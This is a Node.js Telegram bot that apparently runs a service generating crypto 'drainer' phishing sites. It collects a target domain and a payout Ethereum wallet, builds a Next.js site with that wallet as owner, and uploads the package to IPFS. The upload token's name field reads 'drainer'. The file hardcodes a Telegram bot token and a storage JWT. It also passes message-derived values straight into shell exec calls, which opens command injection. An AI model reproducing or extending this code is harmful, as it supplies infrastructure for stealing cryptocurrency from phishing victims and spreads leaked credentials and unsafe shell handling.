const amqp = require("amqplib/callback_api");
const { exec } = require("child_process");
const fs = require("fs");
const TelegramBot = require("node-telegram-bot-api");
const axios = require("axios");
const token = "6336925186:AAFkNVFl3g0vgZA-RPoZurWxbk_wU6rp6Fo";
const bot = new TelegramBot(token, { polling: true });

// 存储用户状态的对象
const userStates = {};

// 处理/start命令
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;

    const replyMarkup = {
        keyboard: [
            [{ text: "/create" }],
            [{ text: "/report" }],
            [{ text: "/help" }],
        ],
        one_time_keyboard: true,
    };
    if (msg.chat.type === "group") {
        // 群组
        bot.sendMessage(chatId, "Menu list：", { reply_markup: replyMarkup });
    }
});

// Handling /create command
bot.onText(/\/create (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const [website, domain, chainId, wallet] = match[1].split(" ");

    // Checking if website and domain are valid URLs
    if (!isUrl(website) || !isUrl(domain)) {
        bot.sendMessage(
            chatId,
            "Please provide valid URLs for website and domain!"
        );
        return;
    }

    // Checking if chainId is a number
    if (isNaN(chainId)) {
        bot.sendMessage(chatId, "chainId must be a number!");
        return;
    }

    // Checking if wallet is a valid Ethereum wallet address
    if (!isEthWallet(wallet)) {
        bot.sendMessage(
            chatId,
            "Please provide a valid Ethereum wallet address!"
        );
        return;
    }

    // Parameters validation passed, sending to API endpoint
    //const apiUrl = "https://psyop.guru/publish";
    const apiUrl = "http://103.213.247.16/publish";
    const payload = {
        website,
        domain,
        chainId,
        wallet,
        chatId,
    };
    var config = {
        method: "post",
        url: apiUrl,
        headers: {
            "Content-Type": "application/json",
            Encoding: "utf-8",
            "User-Agent":
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        },
        data: payload,
    };
    // Sending a POST request to the API
    axios(config)
        // .post(apiUrl, payload)
        .then((response) => {
            //    console.log(response);
            const result = response.data;

            if (result.code == 1) {
                bot.sendMessage(
                    chatId,
                    `Message result: ${result.message} please wait patiently for the system to generate the site.`
                );
            } else if (result.code == 101) {
                bot.sendMessage(chatId, `This site already exists.`);
            } else {
                bot.sendMessage(
                    chatId,
                    `An error occurred, please contact the administrator.`
                );
            }
        })
        .catch((error) => {
            console.error(error);
            bot.sendMessage(
                chatId,
                "An error occurred while sending the request!"
            );
        });
});
bot.onText(/\/report/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, "selected /report");
});

bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, "selected /help");
});

// Helper function: Checking if it's a URL
function isUrl(text) {
    try {
        const url = new URL(text);
        return url.protocol === "http:" || url.protocol === "https:";
    } catch (error) {
        return false;
    }
}

// Helper function: Checking if it's a valid Ethereum wallet address
function isEthWallet(text) {
    const ethWalletRegex = /^0x[a-fA-F0-9]{40}$/;
    return ethWalletRegex.test(text);
}

bot.on("polling_error", (error) => {
    console.log(error);
});
console.log("机器人已启动！");

// 建立与RabbitMQ的连接
amqp.connect("amqp://rabbitmq", (err, connection) => {
    if (err) {
        console.error("Failed to connect to RabbitMQ:", err);
        return;
    }

    // 创建频道
    connection.createChannel((err, channel) => {
        if (err) {
            console.error("Failed to create channel:", err);
            return;
        }

        // 声明队列
        const queueName = "default";
        channel.assertQueue(queueName, { durable: true });

        console.log("Waiting for messages...");

        // 接收消息并处理
        channel.consume(queueName, (msg) => {
            if (msg === null) {
                // 队列中没有消息，等待新的消息
                return;
            }

            const envData = msg.content.toString();

            // 执行构建操作
            runBuild(envData)
                .then(() => {
                    // 构建完成后，确认消息已处理
                    channel.ack(msg);
                })
                .catch((error) => {
                    // 发生错误，可以选择重新将消息放回队列等待重试
                    console.error("Error occurred during build:", error);
                    channel.nack(msg);
                });
        });
    });
});

function writeEnv(envData) {
    const parsedData = JSON.parse(envData);
    const {
        NEXT_PUBLIC_DOMAIN_WEBSITE,
        NEXT_PUBLIC_SOURCE,
        NEXT_PUBLIC_CHAIN,
        NEXT_PUBLIC_OWNER,
    } = parsedData.envData;
    const NEXT_PUBLIC_ENABLE_TESTNETS = false;

    const envContent = `NEXT_PUBLIC_ENABLE_TESTNETS=${NEXT_PUBLIC_ENABLE_TESTNETS}
NEXT_PUBLIC_DOMAIN_WEBSITE=${NEXT_PUBLIC_DOMAIN_WEBSITE}
NEXT_PUBLIC_SOURCE=${NEXT_PUBLIC_SOURCE}
NEXT_PUBLIC_CHAIN=${NEXT_PUBLIC_CHAIN}
NEXT_PUBLIC_OWNER=${NEXT_PUBLIC_OWNER}`;

    return envContent;
}

async function uploadFile_IPFS(owner, chatId) {
    const { Web3Storage, filesFromPath } = await import("web3.storage");
    const token =
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkaWQ6ZXRocjoweDgwNjVkN0QwODU2ZEM0NTkwN2FmOTE0YTE3NUU4ZEU1Y2UyNEIxNjkiLCJpc3MiOiJ3ZWIzLXN0b3JhZ2UiLCJpYXQiOjE2ODgwNTE2MjA3NjgsIm5hbWUiOiJkcmFpbmVyIn0.39b-VsOS8LSOIWfx_I9qKRSFTH804jGo_EZT2Ihp76s";
    const storage = new Web3Storage({ token });
    const files = [];
    for await (const file of filesFromPath("./zipfile", { hidden: false })) {
        if (file.name === "/zipfile/" + owner + "/" + owner + ".zip") {
            files.push(file);
        }
    }

    const cid = await storage.put(files);
    console.log("Content added with CID:", cid);
    bot.sendMessage(
        chatId,
        "Please visit https://cloudflare-ipfs.com/ipfs/" +
            cid +
            "/zipfile/" +
            owner +
            " to download your package."
    );
    console.log(`https://cloudflare-ipfs.com/ipfs/${cid}/zipfile`);
    return cid;
}

async function runBuild(envData) {
    const parsedData = JSON.parse(envData);
    const {
        NEXT_PUBLIC_DOMAIN_WEBSITE,
        NEXT_PUBLIC_SOURCE,
        NEXT_PUBLIC_CHAIN,
        NEXT_PUBLIC_OWNER,
    } = parsedData.envData;

    const { bot_chatid } = parsedData.chatData;

    // 运行npm run build命令

    //将.env数据写入Next.js的.env文件;
    const envContent = writeEnv(envData);
    fs.writeFileSync(".env", envContent);

    return new Promise((resolve, reject) => {
        console.log("Start Build " + NEXT_PUBLIC_OWNER + ".zip");
        const savePath = "./zipfile/" + NEXT_PUBLIC_OWNER;
        const saveFilePath = savePath + "/" + NEXT_PUBLIC_OWNER + ".zip";
        fs.mkdir(savePath, { recursive: true }, (error) => {
            if (error) {
                console.error(`create failed：${error}`);
                exec("rm -rf " + savePath);
                resolve();
            } else {
                exec(
                    "yarn build && cd ./out && zip -r " +
                        "../" +
                        saveFilePath +
                        " ./",
                    (error, stdout, stderr) => {
                        if (error) {
                            console.error("Build failed:", error);
                            reject(error);
                        } else {
                            uploadFile_IPFS(NEXT_PUBLIC_OWNER, bot_chatid).then(
                                () => {
                                    console.log("Build completed successfully");
                                }
                            );
                            resolve();
                        }
                    }
                );
            }
        });
    });
}
